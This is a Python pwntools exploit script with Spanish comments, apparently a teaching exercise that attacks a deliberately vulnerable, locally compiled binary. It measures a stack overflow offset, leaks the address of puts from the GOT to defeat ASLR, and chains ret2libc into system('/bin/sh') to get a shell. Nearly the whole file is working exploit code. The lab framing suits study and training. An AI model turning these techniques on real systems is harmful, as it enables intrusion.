#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""C5 - Leak de libc en dos etapas con ASLR ACTIVADA.
Etapa 1: puts(puts@GOT) filtra la direccion real de puts y la cadena
         devuelve el control a victima() (simbolo fijo del binario).
Etapa 2: libc.address = leak - libc.symbols['puts'] recalcula TODA la
         libc; ret2libc normal con system("/bin/sh").
Aqui NO hay setarch ni ldd para la base: ASLR activada es la gracia.
El unico dato heredado de ldd es la RUTA de libc (para leer el offset
de puts); la base sale del leak en vivo.
USO: python3 c5_leak.py"""
from pwn import *
import re
import subprocess

context.arch = 'amd64'
context.log_level = 'info'

BIN = './c5_leak'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'c5_leak.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

elf = ELF(BIN, checksec=False)

# Piezas fijas del binario (No PIE): trampolin embebido + PLT + GOT.
# Verifica el trampolin tu mismo: ROPgadget --binary ./c5_leak --only "pop|ret"
g_pop_rdi = elf.symbols['g_pop_rdi']
g_ret = elf.symbols['g_ret']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
victima = elf.symbols['victima']
log.info('g_pop_rdi = %#x | puts@plt = %#x | puts@GOT = %#x',
         g_pop_rdi, puts_plt, puts_got)

# RUTA de libc (solo la ruta: el offset de puts dentro de su libc).
ldd_out = subprocess.run(['ldd', BIN], capture_output=True, text=True).stdout
m = re.search(r'libc\.so\.6 => (\S+) \(0x[0-9a-f]+\)', ldd_out)
if not m:
    log.failure('ldd no mostro la ruta de libc.')
    raise SystemExit(1)
libc = ELF(m.group(1), checksec=False)
log.info('libc local: %s (offset de puts: %#x)', m.group(1),
         libc.symbols['puts'])

# ------------------------------------------------------------------
# FASE 1 - offset dinamico local: patron ciclico + corefile (A2)
# ------------------------------------------------------------------
io = process(BIN)                      # ASLR ACTIVADA: process normal
io.recvuntil(b'UNA linea:\n')          # sincroniza CON el salto de linea
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes', offset)

# ------------------------------------------------------------------
# FASE 2 - ETAPA 1 del leak (ASLR en vivo):
#   [g_pop_rdi][puts@GOT][puts@plt][g_ret][victima]
#   puts imprime los 8 bytes guardados en puts@GOT: la direccion REAL
#   de puts. El ret final devuelve el control a victima(): segunda
#   oportunidad sin reiniciar el proceso.
# ------------------------------------------------------------------
io = None                               # nueva ejecucion = nueva base
for intento in range(6):
    io = process(BIN)                  # cada intento: proceso nuevo, base nueva
    io.recvuntil(b'UNA linea:\n')
    stage1 = (b'A' * offset
              + p64(g_pop_rdi)
              + p64(puts_got)
              + p64(puts_plt)
              + p64(g_ret)             # alineacion de la 2a visita
              + p64(victima))
    assert b'\n' not in stage1, 'gets() cortaria el payload en 0x0a'
    io.sendline(stage1)

    # puts imprime la direccion cruda guardada en puts@GOT y un salto de
    # linea: esa linea ES el leak (bytes en little-endian, sin etiqueta).
    leak_line = io.recvline(timeout=5).strip(b'\n')
    leak = u64(leak_line.ljust(8, b'\x00'))
    if leak >= 0x7f0000000000:
        break
    io.close()                         # leak truncado por un 0x0a: reintentar
    log.warn('leak truncado (%#x); reintento %d', leak, intento + 1)
else:
    log.failure('Seis leaks truncados seguidos: mala suerte con ASLR.')
    raise SystemExit(1)
log.success('puts real filtrada: %#x', leak)

# ------------------------------------------------------------------
# FASE 3 - ETAPA 2: base calculada, ret2libc de siempre.
#   libc.address reubica system y "/bin/sh" de golpe.
# ------------------------------------------------------------------
libc.address = leak - libc.symbols['puts']
log.success('Base de libc calculada: %#x', libc.address)
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
log.info('system = %#x | "/bin/sh" = %#x', system, binsh)

io.recvuntil(b'UNA linea:\n')          # victima() abierta por 2a vez
# PITFALL CLAVE (distingue a C5 de B2): aqui NO va el ret de alineacion.
# La 2a visita a victima() entro por TU cadena (un ret), no por un call:
# la paridad de $rsp quedo invertida y el ret extra que B2 te recomendo
# ahora DESALINEA system y revienta en movaps. Medir > memorizar.
stage2 = (b'A' * offset
          + p64(g_pop_rdi)
          + p64(binsh)
          + p64(system))
assert b'\n' not in stage2, 'gets() cortaria el payload en 0x0a'
io.sendline(stage2)
time.sleep(0.5)                        # dejar que system() arme el shell
io.sendline(b'echo PWNED_C5_$(id -u); id; exit')
salida = io.recvall(timeout=4)
io.close()

if b'PWNED_C5' in salida:
    log.success('C5 SUPERADO: leak + calculo de base + ret2libc, todo '
                'con ASLR activada.')
    log.info('Este patron (puts@GOT -> puts@plt -> volver a victima) es '
             'el caballo de batalla de los retos con libc remota.')
else:
    log.failure('C5: sin shell. Pistas: leak = leak - offset_de_puts, '
                'g_ret antes de victima y antes de system, recvuntil.')
